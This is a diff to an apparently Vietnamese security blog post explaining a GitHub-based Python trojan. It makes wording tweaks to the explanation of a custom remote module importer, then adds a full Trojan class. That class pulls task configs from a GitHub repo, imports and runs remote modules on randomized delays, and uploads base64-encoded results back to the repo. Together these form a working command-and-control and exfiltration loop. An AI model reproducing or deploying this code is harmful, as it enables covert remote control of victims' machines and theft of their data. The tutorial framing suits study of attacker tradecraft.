@@ -272,21 +272,79 @@ class GitImporter:
         return new_module
 {% endhighlight %}
 
-Khi bạn import 1 module trong **Python**:
+Khi import 1 module trong **Python**:
 1. Python sẽ tìm kiếm module từ thư mục hệ thống hoặc các đường dẫn tùy chỉnh.
 2. Nếu không tìm thấy, nó kiểm tra các loader tùy chỉnh trong sys.meta_path.
 3. Nếu có loader có phương thức **find_module()**, Python gọi:
 {% highlight bash %}
 loader = GitImporter().find_module('my_remote_module')
 {% endhighlight %}
-* `name = "my_remote_module"` được truyền tự động bởi Python. Tức, khi bạn **import** 1 module mà nó không có sẵn thì `name` là tên của module không có sẵn đó.
-
-4. Nếu **find_module()** trả về một đối tượng hợp lệ, Python sẽ gọi tiếp:
+* `name = "my_remote_module"` được truyền tự động bởi Python. Tức, khi **import** 1 module mà nó không có sẵn thì `name` là tên của module không có sẵn đó.
+* Nếu **find_module()** trả về một đối tượng hợp lệ, Python sẽ gọi tiếp:
 {% highlight bash %}
 loader.load_module('my_remote_module')
 {% endhighlight %}
 * `name = "my_remote_module"` lại được truyền vào load_module() tự động.
-Nhờ đó, dù bạn không gọi load_module() trực tiếp, Python vẫn truyền vào name đúng.
+Nhờ đó, dù không gọi load_module() trực tiếp, Python vẫn truyền vào name đúng.
+
+> Trojan class
+{% highlight bash %}
+class Trojan:
+    """Main Trojan class to manage module execution."""
+    def __init__(self, id, repo):
+        self.id = id
+        self.config_file = f'{id}.json'
+        self.data_path = f'data/{id}/'
+        self.repo = repo
+
+    def get_config(self):
+        """Fetches the configuration file and imports required modules."""
+        try:
+            config_json = get_file_content('config', self.config_file, self.repo)
+            config = json.loads(config_json)
+
+            for task in config:
+                if task['module'] not in sys.modules:
+                    __import__(task['module']) 
+
+            return config
+        except Exception as e:
+            print(f"[!] Error loading config: {e}")
+            return []
+
+    def module_runner(self, module):
+        """Runs a specified module and stores the result."""
+        try:
+            result = sys.modules[module].run()
+            self.store_module_result(result)
+        except Exception as e:
+            print(f"[!] Error running module {module}: {e}")
+
+    def store_module_result(self, data):
+        """Stores module execution results in the repository."""
+        try:
+            message = datetime.now().isoformat()
+            remote_path = f'data/{self.id}/{message}.data'
+            bindata = bytes('%r' % data, 'utf-8')
+            self.repo.create_file(remote_path, message, base64.b64encode(bindata))
+        except Exception as e:
+            print(f"[!] Error storing result: {e}")
+
+    def run(self):
+        """Continuously fetches config and runs tasks."""
+        while True:
+            config = self.get_config()
+            for task in config:
+                threading.Thread(
+                    target=self.module_runner,
+                    args=(task['module'],)
+                ).start()
+                time.sleep(random.randint(1, 10))
+
+            time.sleep(random.randint(30*60, 3*60*60))
+{% endhighlight %}
+
+---
 
 <script src="https://giscus.app/client.js"
         data-repo="ybvy/ybvy.github.io"
